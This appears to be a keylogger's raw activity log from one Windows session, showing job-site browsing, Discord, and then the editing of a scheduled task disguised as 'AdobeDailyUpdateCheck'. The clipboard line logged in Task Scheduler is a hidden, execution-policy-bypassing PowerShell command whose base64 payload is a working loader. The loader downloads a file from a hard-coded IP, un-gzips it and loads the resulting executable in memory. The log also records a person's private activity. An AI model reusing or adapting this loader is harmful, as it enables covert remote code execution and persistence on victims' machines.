@@ -1,0 +1,512 @@
+﻿
+--- WINDOW  2026/08/11 16:34:00  [chrome.exe] Grow | LinkedIn - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 16:34:06  [chrome.exe] Feed | LinkedIn - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:34:09  [chrome.exe] Search | LinkedIn - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 16:34:22  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:34:22  [ShellExperienceHost.exe] Windows Shell Experience Host
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:34:24  [chrome.exe] Search | LinkedIn - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:34:38  [chrome.exe] New Tab - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:34:40  [chrome.exe] Find Your Next Webflow Developer / Designer Job | flowremote - Google Chrome
+----------------------------------------------------------------------------
+  [RMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 16:34:53  [chrome.exe] Hiring: Freelance Webflow Designer + Developer at Club Sociale - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:01  [chrome.exe] Untitled - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:35:02  [chrome.exe] Contract Webflow Developer | Club Sociale | LinkedIn - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:06  [chrome.exe] Hiring: Freelance Webflow Designer + Developer at Club Sociale - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:07  [chrome.exe] Find Your Next Webflow Developer / Designer Job | flowremote - Google Chrome
+----------------------------------------------------------------------------
+  [RMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:13  [chrome.exe] Hiring: Full-time Webflow Developer at Mostli - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:27  [chrome.exe] Find Your Next Webflow Developer / Designer Job | flowremote - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:29  [chrome.exe] New Tab - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:31  [chrome.exe] Webflow Jobs | Flow Wizard - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:41  [chrome.exe] Find Your Next Webflow Developer / Designer Job | flowremote - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:42  [chrome.exe] New Tab - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:45  [chrome.exe] (14) Discord - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:35:48  [chrome.exe] (14) Discord | @M.Maaz - Google Chrome
+----------------------------------------------------------------------------
+  2[Bk]
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 16:36:07  [chrome.exe] Search | LinkedIn - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 16:36:21  [chrome.exe] New Tab - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:36:38  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:36:38  [chrome.exe] New Tab - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:36:45  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:36:46  [chrome.exe] New Tab - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:36:49  [chrome.exe] Search | LinkedIn - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:51:38  [powershell.exe] C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+----------------------------------------------------------------------------
+  r
+
+--- WINDOW  2026/08/11 16:51:49  [explorer.exe] Run
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 16:51:51  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:51:52  [explorer.exe] Program Manager
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:51:54  [mmc.exe] Task Scheduler
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 16:59:26  [mmc.exe] AdobeDailyUpdateCheck_{B8150512-0186-46C3-BAEC-A80AA35AC5D0} Properties (Local Computer)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:00:42  [mmc.exe] Edit Action
+----------------------------------------------------------------------------
+  [Clipboard]
+  -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JAB2AHAAcwBIAG8AcwB0ACAAPQAgACcAaAB0AHQAcAA6AC8ALwAzADgALgAxADgAMAAuADIAMAA0AC4AMgAwADAAJwA7AA0ACgAkAGYAaQBsAGUAVQByAGwAIAA9ACAAJAB2AHAAcwBIAG8AcwB0ACAAKwAgACcALwB0AGUAcwB0AC4AYgBlAGYAXwBmAHIAaQAnADsADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABHAGUAdAAtAEQAbwB3AG4AbABvAGEAZABCAHkAdABlAHMAIAB7AA0ACgAgACAAIAAgAHAAYQByAGEAbQAoAA0ACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQApAF0ADQAKACAAIAAgACAAIAAgACAAIABbAHMAdAByAGkAbgBnAF0AIAAkAFUAcgBpAA0ACgAgACAAIAAgACkADQAKAA0ACgAgACAAIAAgACQAcgBlAHEAdQBlAHMAdAAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBIAHQAdABwAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoAQwByAGUAYQB0AGUAKAAkAFUAcgBpACkAOwANAAoAIAAgACAAIAAkAHIAZQBxAHUAZQBzAHQALgBNAGUAdABoAG8AZAAgAD0AIAAnAEcARQBUACcAOwANAAoAIAAgACAAIAAkAHIAZQBxAHUAZQBzAHQALgBVAHMAZQByAEEAZwBlAG4AdAAgAD0AIAAkAHUAcwBlAHIAQQBnAGUAbgB0ADsADQAKAA0ACgAgACAAIAAgACQAcgBlAHMAcABvAG4AcwBlACAAPQAgACQAcgBlAHEAdQBlAHMAdAAuAEcAZQB0AFIAZQBzAHAAbwBuAHMAZQAoACkAOwANAAoAIAAgACAAIAB0AHIAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAcgBlAHMAcABvAG4AcwBlAC4ARwBlAHQAUgBlAHMAcABvAG4AcwBlAFMAdAByAGUAYQBtACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAJABtAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQA7AA0ACgAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEMAbwBwAHkAVABvACgAJABtAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQApADsADQAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgACQAbQBlAG0AbwByAHkAUwB0AHIAZQBhAG0ALgBUAG8AQQByAHIAYQB5ACgAKQA7AA0ACgAgACAAIAAgAH0ADQAKACAAIAAgACAAZgBpAG4AYQBsAGwAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHAAbwBuAHMAZQAuAEMAbABvAHMAZQAoACkAOwANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgANAAoAZgB1AG4AYwB0AGkAbwBuACAARQB4AHAAYQBuAGQALQBHAHoAaQBwAEIAeQB0AGUAcwAgAHsADQAKACAAIAAgACAAcABhAHIAYQBtACgADQAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgATQBhAG4AZABhAHQAbwByAHkAIAA9ACAAJAB0AHIAdQBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAFsAYgB5AHQAZQBbAF0AXQAgACQAYwBvAG0AcAByAGUAcwBzAGUAZABCAHkAdABlAHMADQAKACAAIAAgACAAKQANAAoADQAKACAAIAAgACAAJABpAG4AcAB1AHQAUwB0AHIAZQBhAG0AIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsACAAJABjAG8AbQBwAHIAZQBzAHMAZQBkAEIAeQB0AGUAcwApADsADQAKACAAIAAgACAAJABvAHUAdABwAHUAdABTAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQA7AA0ACgAgACAAIAAgACQAZwB6AGkAcABTAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACAAJABpAG4AcAB1AHQAUwB0AHIAZQBhAG0ALAAgACgAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAOwANAAoAIAAgACAAIAAkAGcAegBpAHAAUwB0AHIAZQBhAG0ALgBDAG8AcAB5AFQAbwAoACQAbwB1AHQAcAB1AHQAUwB0AHIAZQBhAG0AKQA7AA0ACgANAAoAIAAgACAAIAAkAGcAegBpAHAAUwB0AHIAZQBhAG0ALgBDAGwAbwBzAGUAKAApADsADQAKACAAIAAgACAAJABpAG4AcAB1AHQAUwB0AHIAZQBhAG0ALgBDAGwAbwBzAGUAKAApADsADQAKAA0ACgAgACAAIAAgAHIAZQB0AHUAcgBuACAAJABvAHUAdABwAHUAdABTAHQAcgBlAGEAbQAuAFQAbwBBAHIAcgBhAHkAKAApADsADQAKAH0AOwANAAoADQAKAGYAdQBuAGMAdABpAG8AbgAgAEkAbgB2AG8AawBlAC0ATQBlAHQAaABvAGQARQBuAHQAcgB5ACAAewANAAoAIAAgACAAIABwAGEAcgBhAG0AKAANAAoAIAAgACAAIAAgACAAIAAgAFsAUABhAHIAYQBtAGUAdABlAHIAKABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgACAAIAAgACAAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBNAGUAdABoAG8AZABJAG4AZgBvAF0AIAAkAE0AZQB0AGgAbwBkAA0ACgAgACAAIAAgACkADQAKAA0ACgAgACAAIAAgACQAcgBlAHMAdQBsAHQAIAA9ACAAaQBmACAAKAAkAE0AZQB0AGgAbwBkAC4ARwBlAHQAUABhAHIAYQBtAGUAdABlAHIAcwAoACkALgBDAG8AdQBuAHQAIAAtAGUAcQAgADAAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAE0AZQB0AGgAbwBkAC4ASQBuAHYAbwBrAGUAKAAkAG4AdQBsAGwALAAgACQAbgB1AGwAbAApADsADQAKACAAIAAgACAAfQANAAoAIAAgACAAIABlAGwAcwBlACAAewANAAoAIAAgACAAIAAgACAAIAAgACQATQBlAHQAaABvAGQALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsACAAQAAoACwAWwBzAHQAcgBpAG4AZwBbAF0AXQBAACgAKQApACkAOwANAAoAIAAgACAAIAB9ADsADQAKAA0ACgAgACAAIAAgAGkAZgAgACgAJAByAGUAcwB1AGwAdAAgAC0AaQBzACAAWwBTAHkAcwB0AGUAbQAuAFQAaAByAGUAYQBkAGkAbgBnAC4AVABhAHMAawBzAC4AVABhAHMAawBdACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAEcAZQB0AEEAdwBhAGkAdABlAHIAKAApAC4ARwBlAHQAUgBlAHMAdQBsAHQAKAApADsADQAKACAAIAAgACAAfQANAAoAfQA7AA0ACgANAAoAZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAGEAeQBsAG8AYQBkAEIAeQB0AGUAcwAgAHsADQAKACAAIAAgACAAcABhAHIAYQBtACgADQAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgATQBhAG4AZABhAHQAbwByAHkAIAA9ACAAJAB0AHIAdQBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAFsAYgB5AHQAZQBbAF0AXQAgACQAUABhAHkAbABvAGEAZABCAHkAdABlAHMADQAKACAAIAAgACAAKQANAAoADQAKACAAIAAgACAAaQBmACAAKAAkAFAAYQB5AGwAbwBhAGQAQgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADQAMAA5ADYAIAAtAG8AcgAgACQAUABhAHkAbABvAGEAZABCAHkAdABlAHMAWwAwAF0AIAAtAG4AZQAgADAAeAA0AEQAIAAtAG8AcgAgACQAUABhAHkAbABvAGEAZABCAHkAdABlAHMAWwAxAF0AIAAtAG4AZQAgADAAeAA1AEEAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ASQBuAHYAYQBsAGkAZABEAGEAdABhAEUAeABjAGUAcAB0AGkAbwBuAF0AOgA6AG4AZQB3ACgAJwBQAGEAeQBsAG8AYQBkACAAaQBzACAAbgBvAHQAIABhACAAdgBhAGwAaQBkACAAUABFACAAKABFAFgARQApACAAYQBmAHQAZQByACAAZABlAGMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuACcAKQA7AA0ACgAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgAHQAcgB5ACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAYQBzAHMAZQBtAGIAbAB5ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAFAAYQB5AGwAbwBhAGQAQgB5AHQAZQBzACkAOwANAAoAIAAgACAAIAB9AA0ACgAgACAAIAAgAGMAYQB0AGMAaAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAGwAbwBhAGQARQByAHIAbwByACAAPQAgAGkAZgAgACgAJABuAHUAbABsACAALQBuAGUAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQA7AA0ACgAgACAAIAAgACAAIAAgACAAdABoAHIAbwB3ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUATABvAGEAZABFAHgAYwBlAHAAdABpAG8AbgBdADoAOgBuAGUAdwAoACcASQBuAC0AbQBlAG0AbwByAHkAIABhAHMAcwBlAG0AYgBsAHkAIABsAG8AYQBkACAAZgBhAGkAbABlAGQAOgAgACcAIAArACAAJABsAG8AYQBkAEUAcgByAG8AcgApADsADQAKACAAIAAgACAAfQANAAoADQAKACAAIAAgACAAaQBmACAAKAAkAGEAcwBzAGUAbQBiAGwAeQAuAEUAbgB0AHIAeQBQAG8AaQBuAHQAIAAtAGUAcQAgACQAbgB1AGwAbAApACAAewANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuADsADQAKACAAIAAgACAAfQANAAoADQAKACAAIAAgACAASQBuAHYAbwBrAGUALQBNAGUAdABoAG8AZABFAG4AdAByAHkAIAAtAE0AZQB0AGgAbwBkACAAJABhAHMAcwBlAG0AYgBsAHkALgBFAG4AdAByAHkAUABvAGkAbgB0ADsADQAKAH0ADQAKAA0ACgB0AHIAeQAgAHsADQAKACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACAAJABkAG8AdwBuAGwAbwBhAGQAZQBkAEIAeQB0AGUAcwAgAD0AIABHAGUAdAAtAEQAbwB3AG4AbABvAGEAZABCAHkAdABlAHMAIAAtAFUAcgBpACAAJABmAGkAbABlAFUAcgBsADsADQAKAH0ADQAKAGMAYQB0AGMAaAAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsADQAKACAAIAAgACAAZQB4AGkAdAAgADEAOwANAAoAfQANAAoADQAKAGkAZgAgACgAJABkAG8AdwBuAGwAbwBhAGQAZQBkAEIAeQB0AGUAcwAgAC0AZQBxACAAJABuAHUAbABsACAALQBvAHIAIAAkAGQAbwB3AG4AbABvAGEAZABlAGQAQgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAMAAyADQAKQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAKAAnAEQAbwB3AG4AbABvAGEAZAAgAGYAYQBpAGwAZQBkADoAIABlAHgAcABlAGMAdABlAGQAIABiAGkAbgBhAHIAeQAgAHAAYQB5AGwAbwBhAGQAIABiAHUAdAAgAGcAbwB0ACAAewAwAH0AIABiAHkAdABlAHMALgAnACAALQBmACAAQAAoACQAZABvAHcAbgBsAG8AYQBkAGUAZABCAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAOwANAAoAIAAgACAAIABlAHgAaQB0ACAAMQA7AA0ACgB9AA0ACgANAAoAaQBmACAAKAAkAGQAbwB3AG4AbABvAGEAZABlAGQAQgB5AHQAZQBzAFsAMABdACAALQBlAHEAIAAwAHgAMwBDACkAIAB7AA0ACgAgACAAIAAgAFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACcARABvAHcAbgBsAG8AYQBkACAAZgBhAGkAbABlAGQAOgAgAHMAZQByAHYAZQByACAAcgBlAHQAdQByAG4AZQBkACAASABUAE0ATAAgAGkAbgBzAHQAZQBhAGQAIABvAGYAIABiAGkAbgBhAHIAeQAuACAAQwBoAGUAYwBrACAAVgBQAFMAIABVAFIATAAgAGEAbgBkACAAZgBpAGwAZQAgAHAAYQB0AGgALgAnADsADQAKACAAIAAgACAAZQB4AGkAdAAgADEAOwANAAoAfQANAAoADQAKACMAIABSAGUAcwB0AG8AcgBlACAARwBaAEkAUAAgAGgAZQBhAGQAZQByACAAYgB5AHQAZQBzACAAKABQAEgAUAAgAHMAZQByAHYAZQByACAAbQBhAHMAawBzACAAZgBpAHIAcwB0ACAAOAAgAGIAeQB0AGUAcwAsACAAZQAuAGcALgAgAHsAXAByAHQAZgAxAH0AKQA7AA0ACgAkAGQAbwB3AG4AbABvAGEAZABlAGQAQgB5AHQAZQBzAFsAMABdACAAPQAgADAAeAAxAEYAOwANAAoAJABkAG8AdwBuAGwAbwBhAGQAZQBkAEIAeQB0AGUAcwBbADEAXQAgAD0AIAAwAHgAOABCADsADQAKACQAZABvAHcAbgBsAG8AYQBkAGUAZABCAHkAdABlAHMAWwAyAF0AIAA9ACAAMAB4ADAAOAA7AA0ACgAkAGQAbwB3AG4AbABvAGEAZABlAGQAQgB5AHQAZQBzAFsAMwBdACAAPQAgADAAeAAwADAAOwANAAoAJABkAG8AdwBuAGwAbwBhAGQAZQBkAEIAeQB0AGUAcwBbADQAXQAgAD0AIAAwAHgAMAAwADsADQAKACQAZABvAHcAbgBsAG8AYQBkAGUAZABCAHkAdABlAHMAWwA1AF0AIAA9ACAAMAB4ADAAMAA7AA0ACgAkAGQAbwB3AG4AbABvAGEAZABlAGQAQgB5AHQAZQBzAFsANgBdACAAPQAgADAAeAAwADAAOwANAAoAJABkAG8AdwBuAGwAbwBhAGQAZQBkAEIAeQB0AGUAcwBbADcAXQAgAD0AIAAwAHgAMAAwADsADQAKAA0ACgB0AHIAeQAgAHsADQAKACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACAAJABwAGEAeQBsAG8AYQBkAEIAeQB0AGUAcwAgAD0AIABFAHgAcABhAG4AZAAtAEcAegBpAHAAQgB5AHQAZQBzACAALQBjAG8AbQBwAHIAZQBzAHMAZQBkAEIAeQB0AGUAcwAgACQAZABvAHcAbgBsAG8AYQBkAGUAZABCAHkAdABlAHMAOwANAAoAfQANAAoAYwBhAHQAYwBoACAAewANAAoAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAoACcARwBaAEkAUAAgAGQAZQBjAG8AbQBwAHIAZQBzAHMAaQBvAG4AIABmAGEAaQBsAGUAZAA6ACAAJwAgACsAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQA7AA0ACgAgACAAIAAgAGUAeABpAHQAIAAxADsADQAKAH0ADQAKAA0ACgB0AHIAeQAgAHsADQAKACAAIAAgACAASQBuAHYAbwBrAGUALQBQAGEAeQBsAG8AYQBkAEIAeQB0AGUAcwAgAC0AUABhAHkAbABvAGEAZABCAHkAdABlAHMAIAAkAHAAYQB5AGwAbwBhAGQAQgB5AHQAZQBzADsADQAKAH0ADQAKAGMAYQB0AGMAaAAgAHsADQAKACAAIAAgACAAJABlAHIAcgBvAHIATQBlAHMAcwBhAGcAZQAgAD0AIABpAGYAIAAoACQAbgB1AGwAbAAgAC0AbgBlACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4AKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoAIAAgACAAIAB9AA0ACgAgACAAIAAgAGUAbABzAGUAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsADQAKACAAIAAgACAAfQANAAoADQAKACAAIAAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAJABlAHIAcgBvAHIATQBlAHMAcwBhAGcAZQA7AA0ACgAgACAAIAAgAGUAeABpAHQAIAAxADsADQAKAH0A
+
+--- WINDOW  2026/08/11 17:02:31  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:02:31  [chrome.exe] New Tab - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:02:33  [chrome.exe] ChatGPT: Chat, Work, Create & Code with AI - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:02:35  [chrome.exe] ChatGPT - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:02:42  [chrome.exe] Troubleshoot Adobe Task Window - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Ctrl]v[ENTER]
+
+--- WINDOW  2026/08/11 17:03:58  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:03:58  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:04:00  [mmc.exe] Task Scheduler
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:04:22  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:04:23  [chrome.exe] Troubleshoot Adobe Task Window - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:04:54  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:04:54  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:04:58  [mmc.exe] Task Scheduler
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:05:02  [mmc.exe] Save As
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:05:08  [mmc.exe] Task Scheduler
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:05:10  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:05:11  [chrome.exe] Troubleshoot Adobe Task Window - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 17:05:15  [chrome.exe] Open
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 17:05:20  [chrome.exe] Troubleshoot Adobe Task Window - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 17:07:36  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:07:36  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:07:38  [mmc.exe] Task Scheduler
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:07:41  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:07:41  [mmc.exe] Edit Action
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:07:43  [mmc.exe] AdobeDailyUpdateCheck_{B8150512-0186-46C3-BAEC-A80AA35AC5D0} Properties (Local Computer)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:07:44  [mmc.exe] Task Scheduler
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:08:36  [chrome.exe] Troubleshoot Adobe Task Window - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:08:40  [chrome.exe] Search | LinkedIn - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:08:41  [explorer.exe] Program Manager
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:08:43  [ShellExperienceHost.exe] Windows Shell Experience Host
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:08:43  [ShellExperienceHost.exe] action centre
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:08:47  [explorer.exe] Program Manager
+----------------------------------------------------------------------------
+  [RMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 17:08:58  [ShellExperienceHost.exe] action centre
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:08:59  [explorer.exe] Program Manager
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:09:01  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:09:02  [ApplicationFrameHost.exe] Windows Security
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:09:05  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:09:06  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:09:06  [ApplicationFrameHost.exe] Windows Security
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 17:09:55  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:09:57  [ApplicationFrameHost.exe] Windows Security
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:09:58  [wlrmdr.exe] You’re about to be signed out
+----------------------------------------------------------------------------
+
+================================================================================
+ SESSION START  2026/08/11 17:18:38
+================================================================================
+
+
+--- WINDOW  2026/08/11 17:18:39  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:18:40  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:18:40  [ShellExperienceHost.exe] Windows Shell Experience Host
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:18:41  [ShellExperienceHost.exe] action centre
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:18:46  [ApplicationFrameHost.exe] Windows Security
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:18:48  [uTorrent.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:18:48  [uTorrent.exe] μTorrent 3.6
+----------------------------------------------------------------------------
+
